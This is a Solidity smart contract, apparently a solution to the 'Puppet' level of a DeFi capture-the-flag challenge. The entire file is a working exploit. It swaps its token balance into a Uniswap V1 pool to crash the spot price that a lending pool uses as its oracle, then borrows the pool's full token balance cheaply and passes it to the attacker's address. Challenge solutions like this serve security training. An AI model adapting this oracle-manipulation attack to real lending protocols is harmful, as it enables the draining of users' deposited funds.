// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "./PuppetPool.sol";

interface IUniswapV1Exchange {
    function tokenToEthTransferInput(uint256 tokensSold, uint256 minEth, uint256 deadline, address recipient) external returns(uint256 output);
}

contract PuppetAttacker {
    address _player;
    ERC20 _token;
    IUniswapV1Exchange _uniswapExchange;
    PuppetPool _lendingPool;

    constructor(address player, ERC20 token, IUniswapV1Exchange uniswapExchange, PuppetPool lendingPool) {
        _player = player;
        _token = token;
        _uniswapExchange = uniswapExchange;
        _lendingPool = lendingPool;
    }

    function attack() external payable {
        uint256 amount = _token.balanceOf(address(this));
        uint256 poolAmount = _token.balanceOf(address(_lendingPool));

        _token.approve(address(_uniswapExchange), amount);
        _uniswapExchange.tokenToEthTransferInput(amount, 9, block.timestamp, address(this));

        _lendingPool.borrow{value: _lendingPool.calculateDepositRequired(poolAmount)}(poolAmount, _player);
        _token.transfer(_player, _token.balanceOf(address(this)));
    }

    receive() external payable {}
}
